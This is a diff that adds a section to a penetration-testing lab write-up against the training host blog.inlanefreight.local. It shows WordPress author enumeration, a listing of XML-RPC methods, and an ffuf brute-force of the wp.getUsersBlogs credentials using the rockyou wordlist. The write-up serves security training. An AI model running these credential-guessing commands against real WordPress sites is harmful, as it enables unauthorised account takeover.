@@ -500,3 +500,43 @@ I don't notice any flag files but then immediately in the `wp-content/uploads/` 
 
 ![](Images/Pasted%20image%2020240313190449.png)
 
+### Identify the only non-admin wordpress user
+
+on the blog page we can see posts that have links to each user which we can see uses the url parameter `author`: 
+
+![](Images/Pasted%20image%2020240313191105.png)
+
+for now I actually focus on the erika user because this is the only user I can see other than admin so I first use the xmlrpc.php file to see what methods are available to me: 
+
+```shell
+curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.local/xmlrpc.php
+<?xml version="1.0" encoding="UTF-8"?>
+```
+
+from this I can see that `wp.getUsersBlogs` is available which from the module I know takes in a username and password that I can try to bruteforce:
+
+```shell
+curl -s -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>erika</value></param><param><value>password</value></param></params></methodCall>" http://blog.inlanefreight.local/xmlrpc.php
+<?xml version="1.0" encoding="UTF-8"?>
+```
+
+then I modify this command to work with ffuf and combined with the rockyou.txt file I find a working password and login to the "Erika Jones" profile using the site login form:
+
+```shell
+ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u http://blog.inlanefreight.local/xmlrpc.php -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>erika</value></param><param><value>FUZZ</value></param></params></methodCall>" -fs 403
+```
+
+![](Images/Pasted%20image%2020240313200311.png)
+
+![](Images/Pasted%20image%2020240313200331.png)
+
+however, this user is an admin so now I'll have to go back and enumerate more users
+
+first I'll create a list of numbers to use as author IDs: 
+
+![](Images/Pasted%20image%2020240313200633.png)
+
+only IDs 1-3 are valid and I can see that ID 3 is a user named Charlie Wiggins and is not an admin: 
+
+![](Images/Pasted%20image%2020240313200852.png)
+
